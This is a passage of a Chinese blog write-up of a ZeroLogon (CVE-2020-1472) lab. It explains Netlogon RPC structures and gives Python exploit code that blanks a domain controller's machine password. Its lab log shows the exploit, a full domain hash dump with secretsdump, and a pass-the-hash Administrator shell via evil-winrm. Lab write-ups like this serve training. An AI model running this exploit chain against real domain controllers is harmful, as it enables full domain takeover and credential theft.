+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">NetrServerAuthenticate3</span><span class="params">(</span></span><br><span class="line"><span class="params">   [in, unique, <span class="built_in">string</span>] LOGONSRV_HANDLE PrimaryName,</span></span><br><span class="line"><span class="params">   [in, <span class="built_in">string</span>] <span class="type">wchar_t</span>* AccountName,</span></span><br><span class="line"><span class="params">   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,</span></span><br><span class="line"><span class="params">   [in, <span class="built_in">string</span>] <span class="type">wchar_t</span>* ComputerName,</span></span><br><span class="line"><span class="params">   [in] PNETLOGON_CREDENTIAL ClientCredential,</span></span><br><span class="line"><span class="params">   [in, out] ULONG * NegotiateFlags,</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在第 9 行，我们提供 DC_Handle 作为主名称、目标计算机加 $ 作为机器帐户名称（回想一下，机器帐户没有锁定策略）、安全通道类型作为先前通过 RPC 建立的安全通道类型、target_computer 变量作为计算机名称、密文（16 个字节的“\x00”试图滥用零登录，请记住，密文与明文相同的概率为 1/256），最后，我们的标志变量模仿 Windows 10 客户端计算机的标志变量。</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">NetrServerAuthenticate3</span><span class="params">(</span></span><br><span class="line"><span class="params">   [out] PNETLOGON_CREDENTIAL ServerCredential,</span></span><br><span class="line"><span class="params">   [in, out] ULONG * NegotiateFlags,</span></span><br><span class="line"><span class="params">   [out] ULONG * AccountRid</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此外，我们希望在成功利用零登录后从服务器收到两个（可能是 3 个）东西：ServerCredential 和 AccountRid，我们只会使用其中一个。</p>
+<p>  <strong>Line 44 - 54</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">  <span class="keyword">assert</span> server_auth[<span class="string">'ErrorCode'</span>] == <span class="number">0</span></span><br><span class="line">  <span class="keyword">return</span> rpc_con</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> nrpc.DCERPCSessionError <span class="keyword">as</span> ex:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ex.get_error_code() == <span class="number">0xc0000022</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    fail(<span class="string">f'Unexpected error code from DC: <span class="subst">{ex.get_error_code()}</span>.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> BaseException <span class="keyword">as</span> ex:</span><br><span class="line">  fail(<span class="string">f'Unexpected error: <span class="subst">{ex}</span>.'</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>第 1 行从 Server_auth 变量或为与目标设备建立身份验证会话而分配的变量中检索错误代码。如果成功，我们将返回 rpc_con 变量，该变量将通知我们已成功绕过零登录身份验证。第 3-12 行只是错误处理行，因此程序在收到错误后不会中断并退出。</p>
+<p><strong>传输结束，下一步是什么？</strong></p>
+<p>这就是概念验证的全部内容。它不是什么巨大而可怕的怪物。它甚至成功地为我们利用了零登录漏洞——但它停止了，没有做任何进一步的事情，那么我们该怎么做呢？</p>
+<p>好问题，接下来我们需要查看 Microsoft 文档本身，看看我们可以做些什么来与 NRPC 本身进行交互。如果您不熟悉 NRPC，并且您不是那么技术娴熟的人，请回顾任务 1 中的最后一步，图 3（提示：它告诉我们需要做什么）。</p>
+<p><strong>这一切意味着什么，医生？</strong></p>
+<p>在回过头来查看任务 1 中的图 3 或研究如何通过 RDP 重置密码后，您应该已经找到了以下文档：</p>
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</a></p>
+<p>该文档概述了通过 NRPC 更改密码所需的信息。执行此操作需要以下信息：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> NTSTATUS <span class="title function_">NetrServerPasswordSet2</span><span class="params">(</span></span><br><span class="line"><span class="params">   [in, unique, <span class="built_in">string</span>] LOGONSRV_HANDLE PrimaryName,</span></span><br><span class="line"><span class="params">   [in, <span class="built_in">string</span>] <span class="type">wchar_t</span>* AccountName,</span></span><br><span class="line"><span class="params">   [in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,</span></span><br><span class="line"><span class="params">   [in, <span class="built_in">string</span>] <span class="type">wchar_t</span>* ComputerName,</span></span><br><span class="line"><span class="params">   [in] PNETLOGON_AUTHENTICATOR Authenticator,</span></span><br><span class="line"><span class="params">   [in] PNL_TRUST_PASSWORD ClearNewPassword</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>回头看看 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">NetrServerAuthenticate3</a> 和 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">NetrServerPasswordSet2</a>，我们已经掌握了一些所需的信息，例如主名称、帐户名称、安全通道类型和计算机名称。因此，我们只需要两个值，即 Authenticator 和 ClearNewPassword 值。这两个都是微软的文档，所以我们首先看一下 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab">Authenticator</a>：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NETLOGON_AUTHENTICATOR</span> {</span></span><br><span class="line">  NETLOGON_CREDENTIAL Credential;</span><br><span class="line">  DWORD Timestamp;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>突然，我们遇到了另一个未知项，NETLOGON_CREDENTIAL。幸运的是，微软确实有关于 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd">NETLOGON_CREDENTIAL </a> 的文档：</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NETLOGON_CREDENTIAL</span> {</span></span><br><span class="line">  CHAR data[<span class="number">8</span>];</span><br><span class="line">} NETLOGON_CREDENTIAL,</span><br><span class="line"> *PNETLOGON_CREDENTIAL;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>根据文档，NETLOGON_CREDENTIAL 可以接收 8 个字节的数据，第二个要点概述了“数据字段携带 8 个字节的加密数据，如 Netlogon Credential Computation 中所述”，幸运的是，我们知道这个值，这要归功于 Zero Logon，它是 8 个字节的零。就时间戳而言，它是一个 DWORD 值，因此它可以是 1 或 0。对我来说，零听起来很完美。为了更改密码，Microsoft 文档指出：<br>Netlogon 密码由 512 个字节的随机填充（减去密码的长度，即垃圾+密码）组成，最后四个字节表示密码的长度，总共 516 个字节。为了简单起见，我们可以简单地提供 516 个字节的全 00 来创建一个空密码。最终，我们可以努力创建自己的自定义密码，但再次强调，为了简单起见，我们现在将其设置为空值。 </p>
+<p><strong>升级</strong></p>
+<p>现在我们知道了通过 NRPC 更改密码所需的参数，我们实际上必须用 Python 来实现它。我们需要查看 Impacket 中的 <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py">nrpc.py</a> 模块，以了解如何制作 netrServerPasswordSet2 请求所需的结构：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hNetrServerPasswordSet2</span>(<span class="params">dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob</span>):</span><br><span class="line">    request = NetrServerPasswordSet2()</span><br><span class="line">    request[<span class="string">'PrimaryName'</span>] = checkNullString(primaryName)</span><br><span class="line">    request[<span class="string">'AccountName'</span>] = checkNullString(accountName)</span><br><span class="line">    request[<span class="string">'SecureChannelType'</span>] = secureChannelType</span><br><span class="line">    request[<span class="string">'ComputerName'</span>] = checkNullString(computerName)</span><br><span class="line">    request[<span class="string">'Authenticator'</span>] = authenticator</span><br><span class="line">    request[<span class="string">'ClearNewPassword'</span>] = clearNewPasswordBlob</span><br><span class="line">    <span class="keyword">return</span> dce.request(request)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>正如预期的那样，大多数字段名称与 Microsoft 提供的相同，但有一些差异。接下来，我们还需要知道如何构造 Authenticator 部分：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NETLOGON_AUTHENTICATOR</span>(<span class="title class_ inherited__">NDRSTRUCT</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">'Credential'</span>, NETLOGON_CREDENTIAL),</span><br><span class="line">        (<span class="string">'Timestamp'</span>, DWORD),</span><br><span class="line">    )</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里的格式与之前的格式略有不同，但我们会在将其插入 PoC 时进行相应调整，但在讨论将其插入 PoC 时，我们添加的代码将放在哪里？</p>
+<p>我们添加的代码将放在第 45 行“return rpc_con”之前。在这里我们知道身份验证成功，我们希望在返回上一个函数并终止 RPC 连接之前获取该信息。现在我们知道了需要添加到 PoC 的所有必需信息，我们将为您省去编写自己的代码的艰苦工作，您可以使用下面预先编写的代码。上述解释应该有助于理解它。</p>
+<p><strong>我们插入的附加代码：</strong></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">newPassRequest = nrpc.NetrServerPasswordSet2()</span><br><span class="line">newPassRequest[<span class="string">'PrimaryName'</span>] = dc_handle + <span class="string">'\x00'</span></span><br><span class="line">newPassRequest[<span class="string">'AccountName'</span>] = target_computer + <span class="string">'$\x00'</span></span><br><span class="line">newPassRequest[<span class="string">'SecureChannelType'</span>] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel</span><br><span class="line">auth = nrpc.NETLOGON_AUTHENTICATOR()</span><br><span class="line">auth[<span class="string">'Credential'</span>] = <span class="string">b'\x00'</span> * <span class="number">8</span></span><br><span class="line">auth[<span class="string">'Timestamp'</span>] = <span class="number">0</span></span><br><span class="line">newPassRequest[<span class="string">'Authenticator'</span>] = auth</span><br><span class="line">newPassRequest[<span class="string">'ComputerName'</span>] = target_computer + <span class="string">'\x00'</span></span><br><span class="line">newPassRequest[<span class="string">'ClearNewPassword'</span>] =  <span class="string">b'\x00'</span> * <span class="number">516</span></span><br><span class="line">rpc_con.request(newPassRequest)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时，您的代码应该已经可以使用，并且您应该能够成功利用零登录。如果您仍然遇到问题，您可以使用此处的以下代码：</p>
+<p>  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py">https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py</a></p>
+<h1 id="Lab-It-Up-Lab-It-Up！"><a href="#Lab-It-Up-Lab-It-Up！" class="headerlink" title="Lab It Up!Lab It Up！"></a>Lab It Up!Lab It Up！</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# nmap --min-rate=10000 -p- 10.10.184.188</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-30 01:50 UTC</span><br><span class="line">Warning: 10.10.184.188 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for ip-10-10-184-188.eu-west-1.compute.internal (10.10.184.188)</span><br><span class="line">Host is up (0.0055s latency).</span><br><span class="line">Not shown: 65497 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">53/tcp    open     domain</span><br><span class="line">80/tcp    open     http</span><br><span class="line">88/tcp    open     kerberos-sec</span><br><span class="line">135/tcp   open     msrpc</span><br><span class="line">139/tcp   open     netbios-ssn</span><br><span class="line">389/tcp   open     ldap</span><br><span class="line">445/tcp   open     microsoft-ds</span><br><span class="line">464/tcp   open     kpasswd5</span><br><span class="line">593/tcp   open     http-rpc-epmap</span><br><span class="line">636/tcp   open     ldapssl</span><br><span class="line">3268/tcp  open     globalcatLDAP</span><br><span class="line">3269/tcp  open     globalcatLDAPssl</span><br><span class="line">3389/tcp  open     ms-wbt-server</span><br><span class="line">5985/tcp  open     wsman</span><br><span class="line">9389/tcp  open     adws</span><br><span class="line">23644/tcp filtered unknown</span><br><span class="line">25384/tcp filtered unknown</span><br><span class="line">27163/tcp filtered unknown</span><br><span class="line">32851/tcp filtered unknown</span><br><span class="line">34200/tcp filtered unknown</span><br><span class="line">39278/tcp filtered unknown</span><br><span class="line">40363/tcp filtered unknown</span><br><span class="line">42189/tcp filtered unknown</span><br><span class="line">47001/tcp open     winrm</span><br><span class="line">49664/tcp open     unknown</span><br><span class="line">49665/tcp open     unknown</span><br><span class="line">49666/tcp open     unknown</span><br><span class="line">49668/tcp open     unknown</span><br><span class="line">49669/tcp open     unknown</span><br><span class="line">49670/tcp open     unknown</span><br><span class="line">49673/tcp open     unknown</span><br><span class="line">49674/tcp open     unknown</span><br><span class="line">49686/tcp open     unknown</span><br><span class="line">49695/tcp open     unknown</span><br><span class="line">49801/tcp open     unknown</span><br><span class="line">50798/tcp filtered unknown</span><br><span class="line">53038/tcp filtered unknown</span><br><span class="line">64343/tcp filtered unknown</span><br><span class="line">MAC Address: 02:EF:7A:EF:55:E5 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# nmap -sC -sT -sV -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 10.10.184.188</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-30 01:59 UTC</span><br><span class="line">Nmap scan report for ip-10-10-184-188.eu-west-1.compute.internal (10.10.184.188)</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-30 01:59:12Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2024-04-30T02:01:44+00:00; -1s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.hololive.local</span><br><span class="line">| Not valid before: 2024-04-29T00:55:34</span><br><span class="line">|_Not valid after:  2024-10-29T00:55:34</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: HOLOLIVE</span><br><span class="line">|   NetBIOS_Domain_Name: HOLOLIVE</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: hololive.local</span><br><span class="line">|   DNS_Computer_Name: DC01.hololive.local</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-04-30T02:01:31+00:00</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">MAC Address: 02:EF:7A:EF:55:E5 (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-04-30T02:01:31</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02ef7aef55e5 (unknown)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 160.05 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# python zerologon.py DC01 10.10.184.188</span><br><span class="line"></span><br><span class="line"> _____                   __                         </span><br><span class="line">/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  </span><br><span class="line">\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ </span><br><span class="line"> / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |</span><br><span class="line">/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|</span><br><span class="line">                                  |___/             </span><br><span class="line">                Vulnerability Discovered by Tom Tervoort</span><br><span class="line">                              Exploit by Ronnie Bartwitz</span><br><span class="line">  </span><br><span class="line">Performing authentication attempts...</span><br><span class="line">Failure to Autheticate at attempt number: 198</span><br><span class="line">Zero Logon successfully exploited, changing password.</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# python /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc -no-pass DC01\$@10.10.184.188</span><br><span class="line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::</span><br><span class="line">hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::</span><br><span class="line">hololive.local\a-fubukis:1106:aad3b435b51404eeaad3b435b51404ee:2c90bc6c1c35b71f455f3d08cf4947bd:::</span><br><span class="line">hololive.local\matsurin:1107:aad3b435b51404eeaad3b435b51404ee:a4c59da4140ebd8c59410370c687ef51:::</span><br><span class="line">hololive.local\fubukis:1108:aad3b435b51404eeaad3b435b51404ee:f78bb88e1168abfa165c558e97da9fd4:::</span><br><span class="line">hololive.local\koronei:1109:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::</span><br><span class="line">hololive.local\okayun:1110:aad3b435b51404eeaad3b435b51404ee:a170447f161e5c11441600f0a1b4d93f:::</span><br><span class="line">hololive.local\watamet:1115:aad3b435b51404eeaad3b435b51404ee:50f91788ee209b13ca14e54af199a914:::</span><br><span class="line">hololive.local\mikos:1116:aad3b435b51404eeaad3b435b51404ee:74520070d63d3e2d2bf58da95de0086c:::</span><br><span class="line">DC01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:3415e858d1caff75baeb02c4dd7154328ea6c87f07336a5c926014392a40ed49</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:535501623337ae03580527692f08f0e1</span><br><span class="line">Administrator:des-cbc-md5:bf34685d383e6734</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:9702af2b67c5497940d0f0a7237fbd53d18fb2923fadd37f4ba33d6d5dab4583</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:81628713bd5608becc4325052eb9702d</span><br><span class="line">krbtgt:des-cbc-md5:25f1cea1542f9e31</span><br><span class="line">hololive.local\a-koronei:aes256-cts-hmac-sha1-96:8085b97e73f4dfa6e2cc52a885dd3b1339bf17c17e999a8863686bdf0d800763</span><br><span class="line">hololive.local\a-koronei:aes128-cts-hmac-sha1-96:2f6fd0c9e56a00883ab21544791becab</span><br><span class="line">hololive.local\a-koronei:des-cbc-md5:89df5b3b9b680ea1</span><br><span class="line">hololive.local\a-fubukis:aes256-cts-hmac-sha1-96:7b675daa6cd54ae667a2726a5d99259638b29467fd8e4b3cd6ec4e9564a168dd</span><br><span class="line">hololive.local\a-fubukis:aes128-cts-hmac-sha1-96:883e1d7b14b9024527bd7da69c80a350</span><br><span class="line">hololive.local\a-fubukis:des-cbc-md5:94294304ec7637c1</span><br><span class="line">hololive.local\matsurin:aes256-cts-hmac-sha1-96:cfde1ad860382daa706dd11d585ff1512eef873dc85ae9a88437dc7501fa8e04</span><br><span class="line">hololive.local\matsurin:aes128-cts-hmac-sha1-96:08a011409d044e2f1aec7a6782cbd7b5</span><br><span class="line">hololive.local\matsurin:des-cbc-md5:04fde39d61c215fe</span><br><span class="line">hololive.local\fubukis:aes256-cts-hmac-sha1-96:ed8e594f0b6b89cfa8030bcf9f3e41a9668793a12f598e42893fe8c9f6c5b8eb</span><br><span class="line">hololive.local\fubukis:aes128-cts-hmac-sha1-96:ee003acb55927bb733826aa9a9ddfb53</span><br><span class="line">hololive.local\fubukis:des-cbc-md5:075b8ffde398fe80</span><br><span class="line">hololive.local\koronei:aes256-cts-hmac-sha1-96:6df316ac8564b8254457d973ad61a71a1dfcc5ffe6218cb39f14bb0bbda4a287</span><br><span class="line">hololive.local\koronei:aes128-cts-hmac-sha1-96:6afe7f4196657648505d2af9bbfaf8ba</span><br><span class="line">hololive.local\koronei:des-cbc-md5:a737e6073d15aecd</span><br><span class="line">hololive.local\okayun:aes256-cts-hmac-sha1-96:cf262ddfb3239a555f9d78f90b8c01cd51032d34d104d366b4a94749b47fe6c5</span><br><span class="line">hololive.local\okayun:aes128-cts-hmac-sha1-96:53be14aa0da3f7b657e42c5ed1cef12a</span><br><span class="line">hololive.local\okayun:des-cbc-md5:10896d3786b9628f</span><br><span class="line">hololive.local\watamet:aes256-cts-hmac-sha1-96:45f99941cfc277515aff47a4dfc936e805f7fedd3d175524708c868e2c405ec9</span><br><span class="line">hololive.local\watamet:aes128-cts-hmac-sha1-96:07a6307a5b58f33a61271516ac3364cc</span><br><span class="line">hololive.local\watamet:des-cbc-md5:bf622564a840f192</span><br><span class="line">hololive.local\mikos:aes256-cts-hmac-sha1-96:aab547ee10782fef9aea3b4be5392e7ca9605d0dca95f7510dca40b9628f4233</span><br><span class="line">hololive.local\mikos:aes128-cts-hmac-sha1-96:5c56246d1fd7a4db5ff4fb65ba597e42</span><br><span class="line">hololive.local\mikos:des-cbc-md5:6b2f7fa7a4ecd0c1</span><br><span class="line">DC01$:aes256-cts-hmac-sha1-96:dbf8dbaaccbf17d6fb96cbb3c4046099a4a41d1453ff2d8a8970216ed15d9bf8</span><br><span class="line">DC01$:aes128-cts-hmac-sha1-96:4c146fe76ec6150267564d9bd69769d8</span><br><span class="line">DC01$:des-cbc-md5:cd161923ab9ec11c</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─# evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.184.188</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\Desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        9/20/2020   2:02 PM             24 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</span><br></pre></td></tr></tbody></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/30/THMZeroLogon/">http://mikannse.space/2024/04/30/THMZeroLogon/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/windows/">windows</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/02/24-%EF%BC%94%E6%9D%82%E8%B0%88/" title="24-４杂谈"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">24-４杂谈</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/29/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%B8%80%E5%9B%9B)%E4%B9%8BTHMAllSignsPoint2Pwnage/" title="打靶记录(一一四)之THMAllSignsPoint2Pwnage"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">打靶记录(一一四)之THMAllSignsPoint2Pwnage</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/04/02/IceTHM/" title="IceTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-02</div><div class="title">IceTHM</div></div></a></div><div><a href="/2024/08/02/THMBypassingUAC/" title="THMBypassingUAC"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-02</div><div class="title">THMBypassingUAC</div></div></a></div><div><a href="/2024/04/28/THMPrintNightmare/" title="THMPrintNightmare"><div class="cover" style="background: var(--default-bg-color)"></div><div 